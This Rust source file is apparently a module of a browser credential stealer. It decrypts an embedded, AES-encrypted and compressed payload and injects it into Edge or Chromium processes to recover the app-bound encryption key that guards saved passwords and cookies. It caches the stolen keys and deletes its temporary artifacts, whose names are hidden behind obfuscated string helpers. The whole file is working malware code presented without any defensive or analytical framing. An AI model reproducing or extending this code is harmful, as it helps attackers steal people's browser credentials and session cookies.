use std::{collections::{HashMap, HashSet}, sync::Mutex, time::Duration};
use flate2::read::DeflateDecoder;
use std::io::Read;
use crate::encrypted::*;

const OBFUSCATED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload_obf.bin"));
const AES_KEY:   &[u8; 32] = include_bytes!(concat!(env!("OUT_DIR"), "/payload_key.bin"));
const AES_NONCE: &[u8; 12] = include_bytes!(concat!(env!("OUT_DIR"), "/payload_nonce.bin"));

#[derive(Clone, Copy, PartialEq, Debug)]
#[allow(dead_code)]
enum Architecture { X64, X86 }

fn browser_architecture(browser_name: &str) -> Architecture {
    match browser_name {
        "Edge" | "Edge Beta" | "Edge Dev" => Architecture::X64,
        _ => Architecture::X64,
    }
}

#[inline(never)]
fn decrypt_payload(enc: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
    use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};
    let cipher = Aes256Gcm::new_from_slice(key).unwrap();
    let n = Nonce::from_slice(nonce);
    cipher.decrypt(n, enc).unwrap_or_default()
}

#[inline(never)]
fn get_payload(_arch: Architecture) -> Vec<u8> {
    let compressed = decrypt_payload(OBFUSCATED_PAYLOAD, AES_KEY, AES_NONCE);
    let mut decoder = DeflateDecoder::new(&compressed[..]);
    let mut decompressed = Vec::new();
    decoder.read_to_end(&mut decompressed).expect("");
    decompressed
}

static KEY_CACHE: Mutex<Option<HashMap<String, Vec<u8>>>> = Mutex::new(None);
static FAIL_CACHE: Mutex<Option<HashSet<String>>> = Mutex::new(None);

pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
    let arch = browser_architecture(browser_name);
    let payload = get_payload(arch);
    if payload.is_empty() {
        return None;
    }

    if let Ok(guard) = FAIL_CACHE.lock() {
        if guard.as_ref().is_some_and(|s| s.contains(browser_name)) {
            return None;
        }
    }
    if let Ok(guard) = KEY_CACHE.lock() {
        if let Some(map) = guard.as_ref() {
            if let Some(key) = map.get(browser_name) {
                return Some(key.clone());
            }
        }
    }

    let name_owned = browser_name.to_string();
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        let result = inject::recover_key(&name_owned, &payload);
        let klen = result.as_ref().map(|k| k.len()).unwrap_or(0);
        let _ = tx.send(result);
    });

    let key = match rx.recv_timeout(Duration::from_secs(45)) {
        Ok(Some(k)) => k,
        Ok(None) => {
            if let Ok(mut guard) = FAIL_CACHE.lock() {
                if guard.is_none() {
                    *guard = Some(HashSet::new());
                }
                if let Some(set) = guard.as_mut() {
                    set.insert(browser_name.to_string());
                }
            }
            return None;
        }
        Err(_) => {
            if let Ok(mut guard) = FAIL_CACHE.lock() {
                if guard.is_none() {
                    *guard = Some(HashSet::new());
                }
                if let Some(set) = guard.as_mut() {
                    set.insert(browser_name.to_string());
                }
            }
            return None;
        }
    };

    if let Ok(mut guard) = KEY_CACHE.lock() {
        if guard.is_none() {
            *guard = Some(HashMap::new());
        }
        if let Some(map) = guard.as_mut() {
            map.insert(browser_name.to_string(), key.clone());
        }
    }

    Some(key)
}

pub fn cleanup_legacy_artifacts() {
    let legacy = [
        std::env::temp_dir().join(s_chrome_recovery_result_json()),
        std::env::temp_dir().join(s_cr_headless_profile()),
    ];
    for path in legacy {
        if path.is_dir() {
            let _ = std::fs::remove_dir_all(path);
        } else {
            let _ = std::fs::remove_file(path);
        }
    }
}
